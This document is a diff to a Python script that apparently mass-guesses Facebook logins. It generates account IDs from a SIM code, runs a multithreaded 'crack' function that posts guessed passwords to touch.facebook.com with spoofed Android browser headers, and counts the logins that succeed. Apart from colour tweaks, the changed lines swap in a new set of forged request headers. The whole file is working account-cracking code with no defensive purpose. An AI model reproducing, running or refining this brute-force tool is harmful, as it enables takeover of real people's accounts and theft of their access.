@@ -19,9 +19,9 @@ green = "\033[1;32m"
 yellow = "\033[1;33m"
 blue = "\033[1;34m"
 cyan = "\033[1;36m"
-white = "\033[1;37m"
+white = "\033[1;32m"
 ###-------[FLASH COLORS]-----------####
-colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
+colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;32m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;32m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
 ###-------[LOOP]-----------####
 loop = 0
 idz = []
@@ -90,10 +90,9 @@ def random_number():
     with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
         total_idz = str(len(idz))
-        linex()
-        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
-        print(' \033[1;37m(\033[1;32m√\033[1;37m) \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
-        print(" \x1b[38;5;208m(√) \x1b[38;5;205mUse Flight Mode For Speed UP")
+        print(f' \033[1;32m(√) \033[1;32mTotal IDs  :\033[1;32m ',total_idz)
+        print(' \033[1;32m(\033[1;32m√\033[1;32m) \033[1;32mCHOICE SIM CODE : \033[1;32m'+code)
+        print(" \033[1;32m(√) \033[1;32mUse Flight Mode For Speed UP")
         linex()
         for xyz in idz:
             uid = code+xyz
@@ -113,7 +112,7 @@ def crack(uid, pww, total_idz):
     global oks
     global cps
     global bkas
-    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
+    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\033[1;32m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
     sys.stdout.write(f"\r{x}[SUMON]- {loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}  ")
     sys.stdout.flush()
     try:
@@ -147,28 +146,23 @@ def crack(uid, pww, total_idz):
             '__a': '',
             '__user': '0'}
             headers = {
-            "Host":"touch.facebook.com",
-            "Connection":"keep-alive",
-            "Upgrade-Insecure-Requests":"1",
-            "User-Agent":useragent_facebook(),
-            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "dnt":"1",
-            "X-Requested-With":"mark.via.gp",
-            "Sec-Fetch-Site":"none",
-            "Sec-Fetch-Mode":"navigate",
-            "Sec-Fetch-User":"?1",
-            "Sec-Fetch-Dest":"document",
-            "dpr":"1.75",
-            "viewport-width":"980",
-            "sec-ch-ua":"\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
-            "sec-ch-ua-mobile":"?1",
-            "sec-ch-ua-platform":"\"Android\"",
-            "sec-ch-ua-platform-version":"\"\"",
-            "sec-ch-ua-model":"\"\"",
-            "sec-ch-ua-full-version-list":"",
-            "sec-ch-prefers-color-scheme":"dark",
-            "Accept-Encoding":"gzip, deflate, br, zstd",
-            "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
+            'authority': 'touch.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://touch.facebook.com/login/save-device/',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': useragent_facebook(),
+            'viewport-width': '980',}
             response = session.post('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
             #print(headers)
             log_cookies = session.cookies.get_dict().keys()
